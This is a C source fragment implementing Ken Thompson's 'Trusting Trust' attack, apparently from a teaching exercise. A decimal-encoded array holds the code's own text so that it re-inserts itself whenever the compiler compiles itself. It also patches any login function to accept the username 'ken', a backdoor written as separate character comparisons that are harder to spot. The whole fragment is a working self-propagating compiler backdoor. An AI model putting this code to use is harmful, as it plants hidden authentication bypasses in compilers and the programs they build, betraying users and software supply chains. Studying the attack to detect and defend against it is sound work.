char prog[] = {
	10, 	32, 	32, 	32, 	32, 	115, 	116, 	97,
	116, 	105, 	99, 	32, 	99, 	104, 	97, 	114,
	32, 	99, 	111, 	109, 	112, 	105, 	108, 	101,
	95, 	115, 	105, 	103, 	91, 	93, 	32, 	61,
	10, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	34, 	115, 	116, 	97, 	116, 	105, 	99,
	32, 	118, 	111, 	105, 	100, 	32, 	99, 	111,
	109, 	112, 	105, 	108, 	101, 	40, 	99, 	104,
	97, 	114, 	32, 	42, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	44, 	32, 	99, 	104, 	97,
	114, 	32, 	42, 	111, 	117, 	116, 	110, 	97,
	109, 	101, 	41, 	32, 	123, 	92, 	110, 	34,
	10, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	34, 	32, 	32, 	32, 	32, 	70, 	73,
	76, 	69, 	32, 	42, 	102, 	112, 	32, 	61,
	32, 	102, 	111, 	112, 	101, 	110, 	40, 	92,
	34, 	46, 	47, 	116, 	101, 	109, 	112, 	45,
	111, 	117, 	116, 	46, 	99, 	92, 	34, 	44,
	32, 	92, 	34, 	119, 	92, 	34, 	41, 	59,
	92, 	110, 	34, 	10, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	34, 	32, 	32, 	32,
	32, 	97, 	115, 	115, 	101, 	114, 	116, 	40,
	102, 	112, 	41, 	59, 	34, 	10, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	59, 	10,
	10, 	32, 	32, 	32, 	32, 	99, 	104, 	97,
	114, 	42, 	32, 	99, 	111, 	109, 	112, 	105,
	108, 	101, 	95, 	97, 	116, 	116, 	97, 	99,
	107, 	32, 	61, 	32, 	112, 	114, 	111, 	103,
	59, 	10, 	10, 	32, 	32, 	32, 	32, 	99,
	104, 	97, 	114, 	42, 	32, 	108, 	111, 	99,
	97, 	116, 	105, 	111, 	110, 	32, 	61, 	32,
	115, 	116, 	114, 	115, 	116, 	114, 	40, 	112,
	114, 	111, 	103, 	114, 	97, 	109, 	44, 	32,
	99, 	111, 	109, 	112, 	105, 	108, 	101, 	95,
	115, 	105, 	103, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	10, 	32, 	32, 	32, 	32, 	105,
	102, 	32, 	40, 	108, 	111, 	99, 	97, 	116,
	105, 	111, 	110, 	41, 	32, 	123, 	10, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	99,
	104, 	97, 	114, 	32, 	112, 	114, 	111, 	103,
	95, 	97, 	115, 	95, 	115, 	116, 	114, 	105,
	110, 	103, 	91, 	49, 	48, 	48, 	48, 	48,
	48, 	48, 	93, 	59, 	10, 	10, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	99, 	104,
	97, 	114, 	42, 	32, 	118, 	97, 	108, 	32,
	61, 	32, 	34, 	99, 	104, 	97, 	114, 	32,
	112, 	114, 	111, 	103, 	91, 	93, 	32, 	61,
	32, 	123, 	34, 	59, 	10, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	115, 	116, 	114,
	99, 	97, 	116, 	40, 	112, 	114, 	111, 	103,
	95, 	97, 	115, 	95, 	115, 	116, 	114, 	105,
	110, 	103, 	44, 	32, 	118, 	97, 	108, 	41,
	59, 	10, 	10, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	99, 	104, 	97, 	114, 	32,
	98, 	117, 	102, 	102, 	101, 	114, 	91, 	53,
	48, 	48, 	93, 	59, 	10, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	102, 	111, 	114,
	32, 	40, 	105, 	110, 	116, 	32, 	105, 	32,
	61, 	32, 	48, 	59, 	32, 	105, 	32, 	60,
	32, 	115, 	105, 	122, 	101, 	111, 	102, 	40,
	112, 	114, 	111, 	103, 	41, 	32, 	47, 	32,
	115, 	105, 	122, 	101, 	111, 	102, 	40, 	112,
	114, 	111, 	103, 	91, 	48, 	93, 	41, 	32,
	45, 	32, 	49, 	59, 	32, 	105, 	43, 	43,
	41, 	32, 	123, 	10, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	115, 	112,
	114, 	105, 	110, 	116, 	102, 	40, 	98, 	117,
	102, 	102, 	101, 	114, 	44, 	32, 	34, 	37,
	100, 	34, 	44, 	32, 	112, 	114, 	111, 	103,
	91, 	105, 	93, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	115, 	116, 	114, 	99, 	97, 	116, 	40, 	112,
	114, 	111, 	103, 	95, 	97, 	115, 	95, 	115,
	116, 	114, 	105, 	110, 	103, 	44, 	32, 	98,
	117, 	102, 	102, 	101, 	114, 	41, 	59, 	10,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	115, 	116, 	114, 	99, 	97, 	116,
	40, 	112, 	114, 	111, 	103, 	95, 	97, 	115,
	95, 	115, 	116, 	114, 	105, 	110, 	103, 	44,
	32, 	34, 	44, 	34, 	41, 	59, 	10, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	125,
	10, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	115, 	116, 	114, 	99, 	97, 	116, 	40,
	112, 	114, 	111, 	103, 	95, 	97, 	115, 	95,
	115, 	116, 	114, 	105, 	110, 	103, 	44, 	32,
	34, 	32, 	48, 	125, 	59, 	92, 	110, 	34,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	47, 	47, 	70, 	105, 	114,
	115, 	116, 	32, 	99, 	111, 	112, 	121, 	32,
	101, 	118, 	101, 	114, 	121, 	116, 	104, 	105,
	110, 	103, 	32, 	97, 	102, 	116, 	101, 	114,
	32, 	110, 	101, 	101, 	100, 	108, 	101, 	32,
	116, 	111, 	32, 	116, 	104, 	101, 	32, 	112,
	111, 	105, 	110, 	116, 	32, 	105, 	116, 	32,
	110, 	101, 	101, 	100, 	115, 	32, 	116, 	111,
	32, 	98, 	101, 	32, 	102, 	111, 	114, 	32,
	99, 	111, 	114, 	114, 	101, 	99, 	116, 	32,
	115, 	112, 	97, 	99, 	105, 	110, 	103, 	10,
	32, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	105, 	110, 	116, 	32, 	99, 	111, 	109, 	112,
	105, 	108, 	101, 	95, 	115, 	105, 	103, 	95,
	108, 	101, 	110, 	32, 	61, 	32, 	115, 	116,
	114, 	108, 	101, 	110, 	40, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	95, 	115, 	105, 	103,
	41, 	59, 	10, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	105, 	110, 	116, 	32, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	95, 	97,
	116, 	116, 	97, 	99, 	107, 	95, 	108, 	101,
	110, 	32, 	61, 	32, 	115, 	116, 	114, 	108,
	101, 	110, 	40, 	99, 	111, 	109, 	112, 	105,
	108, 	101, 	95, 	97, 	116, 	116, 	97, 	99,
	107, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	105, 	110, 	116, 	32,
	112, 	114, 	111, 	103, 	95, 	97, 	115, 	95,
	115, 	116, 	114, 	105, 	110, 	103, 	95, 	108,
	101, 	110, 	32, 	61, 	32, 	115, 	116, 	114,
	108, 	101, 	110, 	40, 	112, 	114, 	111, 	103,
	95, 	97, 	115, 	95, 	115, 	116, 	114, 	105,
	110, 	103, 	41, 	59, 	10, 	10, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	115, 	116,
	114, 	99, 	112, 	121, 	40, 	108, 	111, 	99,
	97, 	116, 	105, 	111, 	110, 	32, 	43, 	32,
	99, 	111, 	109, 	112, 	105, 	108, 	101, 	95,
	115, 	105, 	103, 	95, 	108, 	101, 	110, 	32,
	43, 	32, 	99, 	111, 	109, 	112, 	105, 	108,
	101, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	95, 	108, 	101, 	110, 	32, 	43, 	32, 	112,
	114, 	111, 	103, 	95, 	97, 	115, 	95, 	115,
	116, 	114, 	105, 	110, 	103, 	95, 	108, 	101,
	110, 	44, 	32, 	108, 	111, 	99, 	97, 	116,
	105, 	111, 	110, 	32, 	43, 	32, 	99, 	111,
	109, 	112, 	105, 	108, 	101, 	95, 	115, 	105,
	103, 	95, 	108, 	101, 	110, 	41, 	59, 	10,
	10, 	32, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	47, 	47, 	84, 	104, 	101, 	110, 	32,
	99, 	111, 	112, 	121, 	32, 	105, 	110, 	32,
	116, 	104, 	101, 	32, 	97, 	116, 	116, 	97,
	99, 	107, 	10, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	115, 	116, 	114, 	110, 	99,
	112, 	121, 	40, 	108, 	111, 	99, 	97, 	116,
	105, 	111, 	110, 	32, 	43, 	32, 	99, 	111,
	109, 	112, 	105, 	108, 	101, 	95, 	115, 	105,
	103, 	95, 	108, 	101, 	110, 	44, 	32, 	112,
	114, 	111, 	103, 	95, 	97, 	115, 	95, 	115,
	116, 	114, 	105, 	110, 	103, 	44, 	32, 	112,
	114, 	111, 	103, 	95, 	97, 	115, 	95, 	115,
	116, 	114, 	105, 	110, 	103, 	95, 	108, 	101,
	110, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	115, 	116, 	114, 	110,
	99, 	112, 	121, 	40, 	108, 	111, 	99, 	97,
	116, 	105, 	111, 	110, 	32, 	43, 	32, 	99,
	111, 	109, 	112, 	105, 	108, 	101, 	95, 	115,
	105, 	103, 	95, 	108, 	101, 	110, 	32, 	43,
	32, 	112, 	114, 	111, 	103, 	95, 	97, 	115,
	95, 	115, 	116, 	114, 	105, 	110, 	103, 	95,
	108, 	101, 	110, 	44, 	32, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	95, 	97, 	116, 	116,
	97, 	99, 	107, 	44, 	32, 	99, 	111, 	109,
	112, 	105, 	108, 	101, 	95, 	97, 	116, 	116,
	97, 	99, 	107, 	95, 	108, 	101, 	110, 	41,
	59, 	10, 	10, 	32, 	32, 	32, 	32, 	125,
	10, 	10, 	10, 	32, 	32, 	32, 	32, 	115,
	116, 	97, 	116, 	105, 	99, 	32, 	99, 	104,
	97, 	114, 	32, 	108, 	111, 	103, 	105, 	110,
	95, 	115, 	105, 	103, 	91, 	93, 	32, 	61,
	32, 	34, 	105, 	110, 	116, 	32, 	108, 	111,
	103, 	105, 	110, 	40, 	99, 	104, 	97, 	114,
	32, 	42, 	117, 	115, 	101, 	114, 	41, 	32,
	123, 	34, 	59, 	10, 	32, 	32, 	32, 	32,
	47, 	47, 	32, 	115, 	116, 	97, 	116, 	105,
	99, 	32, 	99, 	104, 	97, 	114, 	32, 	108,
	111, 	103, 	105, 	110, 	95, 	97, 	116, 	116,
	97, 	99, 	107, 	91, 	93, 	32, 	61, 	32,
	34, 	105, 	102, 	40, 	115, 	116, 	114, 	99,
	109, 	112, 	40, 	117, 	115, 	101, 	114, 	44,
	32, 	92, 	34, 	107, 	101, 	110, 	92, 	34,
	41, 	32, 	61, 	61, 	32, 	48, 	41, 	32,
	114, 	101, 	116, 	117, 	114, 	110, 	32, 	49,
	59, 	34, 	59, 	10, 	32, 	32, 	32, 	32,
	115, 	116, 	97, 	116, 	105, 	99, 	32, 	99,
	104, 	97, 	114, 	32, 	108, 	111, 	103, 	105,
	110, 	95, 	97, 	116, 	116, 	97, 	99, 	107,
	91, 	93, 	32, 	61, 	32, 	34, 	105, 	102,
	40, 	117, 	115, 	101, 	114, 	91, 	48, 	93,
	32, 	61, 	61, 	32, 	39, 	107, 	39, 	32,
	38, 	38, 	32, 	117, 	115, 	101, 	114, 	91,
	49, 	93, 	32, 	61, 	61, 	32, 	39, 	101,
	39, 	32, 	38, 	38, 	32, 	117, 	115, 	101,
	114, 	91, 	50, 	93, 	32, 	61, 	61, 	32,
	39, 	110, 	39, 	32, 	38, 	38, 	32, 	115,
	116, 	114, 	108, 	101, 	110, 	40, 	117, 	115,
	101, 	114, 	41, 	32, 	61, 	61, 	32, 	51,
	41, 	32, 	114, 	101, 	116, 	117, 	114, 	110,
	32, 	49, 	59, 	34, 	59, 	10, 	32, 	32,
	32, 	32, 	108, 	111, 	99, 	97, 	116, 	105,
	111, 	110, 	32, 	61, 	32, 	115, 	116, 	114,
	115, 	116, 	114, 	40, 	112, 	114, 	111, 	103,
	114, 	97, 	109, 	44, 	32, 	108, 	111, 	103,
	105, 	110, 	95, 	115, 	105, 	103, 	41, 	59,
	10, 	32, 	32, 	32, 	32, 	105, 	102, 	32,
	40, 	108, 	111, 	99, 	97, 	116, 	105, 	111,
	110, 	41, 	32, 	123, 	10, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	105, 	110, 	116,
	32, 	108, 	111, 	103, 	105, 	110, 	95, 	115,
	105, 	103, 	95, 	108, 	101, 	110, 	32, 	61,
	32, 	115, 	116, 	114, 	108, 	101, 	110, 	40,
	108, 	111, 	103, 	105, 	110, 	95, 	115, 	105,
	103, 	41, 	59, 	10, 	32, 	32, 	32, 	32,
	32, 	32, 	32, 	32, 	105, 	110, 	116, 	32,
	108, 	111, 	103, 	105, 	110, 	95, 	97, 	116,
	116, 	97, 	99, 	107, 	95, 	108, 	101, 	110,
	32, 	61, 	32, 	115, 	116, 	114, 	108, 	101,
	110, 	40, 	108, 	111, 	103, 	105, 	110, 	95,
	97, 	116, 	116, 	97, 	99, 	107, 	41, 	59,
	10, 	10, 	32, 	32, 	32, 	32, 	32, 	32,
	32, 	32, 	109, 	101, 	109, 	109, 	111, 	118,
	101, 	40, 	108, 	111, 	99, 	97, 	116, 	105,
	111, 	110, 	32, 	43, 	32, 	108, 	111, 	103,
	105, 	110, 	95, 	115, 	105, 	103, 	95, 	108,
	101, 	110, 	32, 	43, 	32, 	108, 	111, 	103,
	105, 	110, 	95, 	97, 	116, 	116, 	97, 	99,
	107, 	95, 	108, 	101, 	110, 	44, 	32, 	108,
	111, 	99, 	97, 	116, 	105, 	111, 	110, 	32,
	43, 	32, 	108, 	111, 	103, 	105, 	110, 	95,
	115, 	105, 	103, 	95, 	108, 	101, 	110, 	44,
	32, 	115, 	116, 	114, 	108, 	101, 	110, 	40,
	108, 	111, 	99, 	97, 	116, 	105, 	111, 	110,
	32, 	43, 	32, 	108, 	111, 	103, 	105, 	110,
	95, 	115, 	105, 	103, 	95, 	108, 	101, 	110,
	41, 	43, 	49, 	41, 	59, 	10, 	32, 	32,
	32, 	32, 	32, 	32, 	32, 	32, 	115, 	116,
	114, 	110, 	99, 	112, 	121, 	40, 	108, 	111,
	99, 	97, 	116, 	105, 	111, 	110, 	32, 	43,
	32, 	108, 	111, 	103, 	105, 	110, 	95, 	115,
	105, 	103, 	95, 	108, 	101, 	110, 	44, 	32,
	108, 	111, 	103, 	105, 	110, 	95, 	97, 	116,
	116, 	97, 	99, 	107, 	44, 	32, 	108, 	111,
	103, 	105, 	110, 	95, 	97, 	116, 	116, 	97,
	99, 	107, 	95, 	108, 	101, 	110, 	41, 	59,
	10, 	32, 	32, 	32, 	32, 	125, 0 };

    static char compile_sig[] =
                "static void compile(char *program, char *outname) {\n"
                "    FILE *fp = fopen(\"./temp-out.c\", \"w\");\n"
                "    assert(fp);"
                ;

    char* compile_attack = prog;

    char* location = strstr(program, compile_sig);
    
    if (location) {
        char prog_as_string[1000000];

        char* val = "char prog[] = {";
        strcat(prog_as_string, val);

        char buffer[500];
        for (int i = 0; i < sizeof(prog) / sizeof(prog[0]) - 1; i++) {
          sprintf(buffer, "%d", prog[i]);
          strcat(prog_as_string, buffer);
          strcat(prog_as_string, ",");
        }
        strcat(prog_as_string, " 0};\n");
        //First copy everything after needle to the point it needs to be for correct spacing
        int compile_sig_len = strlen(compile_sig);
        int compile_attack_len = strlen(compile_attack);
        int prog_as_string_len = strlen(prog_as_string);

        strcpy(location + compile_sig_len + compile_attack_len + prog_as_string_len, location + compile_sig_len);

        //Then copy in the attack
        strncpy(location + compile_sig_len, prog_as_string, prog_as_string_len);
        strncpy(location + compile_sig_len + prog_as_string_len, compile_attack, compile_attack_len);

    }


    static char login_sig[] = "int login(char *user) {";
    // static char login_attack[] = "if(strcmp(user, \"ken\") == 0) return 1;";
    static char login_attack[] = "if(user[0] == 'k' && user[1] == 'e' && user[2] == 'n' && strlen(user) == 3) return 1;";
    location = strstr(program, login_sig);
    if (location) {
        int login_sig_len = strlen(login_sig);
        int login_attack_len = strlen(login_attack);

        memmove(location + login_sig_len + login_attack_len, location + login_sig_len, strlen(location + login_sig_len)+1);
        strncpy(location + login_sig_len, login_attack, login_attack_len);
    }